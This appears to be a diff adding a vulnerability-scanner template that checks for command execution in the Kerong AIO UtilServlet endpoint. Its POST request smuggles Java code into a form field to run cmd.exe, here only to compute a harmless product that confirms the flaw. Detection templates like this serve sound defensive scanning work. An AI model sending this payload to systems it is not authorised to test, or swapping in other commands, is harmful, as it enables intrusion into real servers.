@@ -1,0 +1,36 @@
+id: kerong-aio-utilservlet-rce
+info:
+  name: 科荣AIO UtilServlet Arbitrary Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+variables:
+  t1: "{{rand_int(100, 999)}}"
+  t2: "{{rand_int(100, 999)}}"
+  t3: "{{to_number(t1)*to_number(t2)}}"
+http:
+  - raw:
+      - |
+        POST /UtilServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+set+/a+{{t1}}*{{t2}}").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "text/html"
